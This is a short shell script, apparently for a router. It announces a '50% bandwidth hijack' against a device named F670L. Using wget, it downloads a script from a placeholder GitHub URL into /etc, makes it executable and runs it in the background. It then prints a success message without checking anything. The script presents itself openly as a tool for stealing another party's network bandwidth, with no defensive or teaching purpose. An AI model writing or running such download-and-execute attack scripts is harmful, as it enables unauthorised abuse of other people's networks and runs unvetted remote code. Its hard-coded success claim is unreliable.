#!/bin/sh
echo "[💀] DEPLOYING 50% BANDWIDTH HIJACK..."
echo "[🎯] Stealing 50% bandwidth from F670L..."
wget -q -O /etc/tenda_hijack.sh https://raw.githubusercontent.com/YOUR_USER/tenda-hijack/main/ROUTER_SCRIPTS/tenda_hijack.sh
chmod +x /etc/tenda_hijack.sh
/etc/tenda_hijack.sh &
echo "[✅] 50% BANDWIDTH SUCCESSFULLY HIJACKED!"